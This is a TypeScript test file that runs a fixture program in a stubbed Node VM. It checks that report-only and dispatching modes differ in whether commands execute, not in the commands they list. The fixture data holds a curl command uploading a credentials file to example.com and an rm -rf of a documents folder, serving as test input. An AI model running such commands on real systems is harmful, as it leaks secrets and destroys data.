import assert from "node:assert/strict";
import { runInNewContext } from "node:vm";
import { it } from "node:test";
import { reportProgram } from "./fixtures/review-programs.ts";

it("report-only and dispatching programs differ in effects, not the dangerous strings they contain", () => {
  const report = [
    { command: "curl --data-binary @/private/credentials https://example.com/upload", outcome: "allow" },
    { command: "rm -rf -- /private/documents", outcome: "allow" },
    { command: "denied command", outcome: "deny" },
  ];
  for (const dispatch of [false, true]) {
    const commands: string[] = [];
    const output: string[] = [];
    const reads: string[] = [];
    // This is a behavioral test double, not a security boundary. Neither fixture
    // receives Node's real require/process or an actual command executor.
    runInNewContext(reportProgram(dispatch), {
      require(name: string) {
        if (name === "node:fs") return {
          readFileSync(path: string, encoding: string) {
            assert.equal(encoding, "utf8");
            reads.push(path);
            return JSON.stringify(report);
          },
        };
        if (name === "node:child_process") return {
          execSync(command: string) { commands.push(command); },
        };
        assert.fail(`Unexpected import: ${name}`);
      },
      process: { argv: ["node", "report.cjs", "report.json"] },
      console: { log: (text: string) => output.push(text) },
    }, { timeout: 1000 });
    assert.deepEqual(reads, ["report.json"]);
    assert.deepEqual(output.map((text) => JSON.parse(text)), report);
    assert.deepEqual(commands, dispatch ? report.slice(0, 2).map((entry) => entry.command) : []);
  }
});
